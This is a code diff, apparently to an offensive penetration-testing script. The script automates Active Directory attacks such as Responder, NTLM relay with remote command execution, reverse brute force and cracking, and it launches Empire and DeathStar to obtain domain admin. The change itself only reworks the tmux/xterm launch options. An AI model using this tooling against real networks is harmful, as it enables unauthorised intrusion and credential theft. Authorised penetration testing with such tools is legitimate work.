@@ -9,6 +9,7 @@ import string
 import signal
 import random
 import asyncio
+import libtmux
 import requests
 import argparse
 import netifaces
@@ -31,7 +32,6 @@ def parse_args():
     # Create the arguments
     parser = argparse.ArgumentParser()
     parser.add_argument("-l", "--hostlist", help="Host list file")
-    parser.add_argument("--xterm", help="Run Empire and DeathStar in xterm windows instead of tmux session. Requires --auto option to be used")
     parser.add_argument("-x", "--xml", help="Path to Nmap XML file")
     parser.add_argument("-p", "--password-list", help="Path to password list file for attack 1's reverse bruteforce")
     parser.add_argument("-s", "--skip", default='', help="Skip [rid/scf/responder/ntlmrelay/dns/crack] where the first 5 options correspond to attacks 1-5")
@@ -39,7 +39,7 @@ def parse_args():
     parser.add_argument("-i", "--interface", help="Interface to use with Responder")
     parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
     parser.add_argument("-d", "--domain", help="Domain to use with theHarvester to gather usernames for reverse bruteforce, e.g., google.com")
-    parser.add_argument("--auto", action="store_true", help="Start up Empire and DeathStar to automatically get domain admin")
+    parser.add_argument("--auto", default='tmux', help="Start up Empire and DeathStar to automatically get domain admin using [xterm/tmux], defaults to tmux, e.g., --auto xterm")
     return parser.parse_args()
 
 # Colored terminal output
@@ -1308,12 +1308,14 @@ def run_tmux_procs(empire_cmd, ds_cmd):
     pane = win.select_pane(0)
     pane.send_keys('cd {}'.format(cwd))
     pane.send_keys('pipenv shell')
+    time.sleep(4)
     pane.send_keys(empire_cmd)
     time.sleep(10)
     pane = win.split_window(attach=False)
     pane.select_pane()
     pane.send_keys('cd {}'.format(cwd))
     pane.send_keys('pipenv shell')
+    time.sleep(4)
     pane.send_keys(ds_cmd)
     time.sleep(5)
 
@@ -1364,7 +1366,7 @@ def run_empire_deathstar(iface, args):
     empire_cmd = 'cd submodules/Empire;python2 empire --rest --username {} --password {}'.format(user,passwd)
     ds_cmd = 'python submodules/DeathStar/DeathStar.py -u {} -p {} -lip http://{}:8080 -lp 8080'.format(user, passwd, get_local_ip(iface))
 
-    if args.xterm:
+    if args.auto == 'xterm':
         empire_proc = run_proc_xterm(empire_cmd)
         # Time for Empire to load
         time.sleep(10)
@@ -1509,7 +1511,7 @@ if __name__ == "__main__":
         print_bad('Run as root')
         sys.exit()
 
-    if args.auto and not args.xterm:
+    if args.auto == 'tmux':
         print_info('Auto domain admin option selected. Open a new terminal and run this command:')
         print('     sudo tmux new -s icebreaker')
         input(colored('[*] ', 'blue')+'Hit enter to continue')
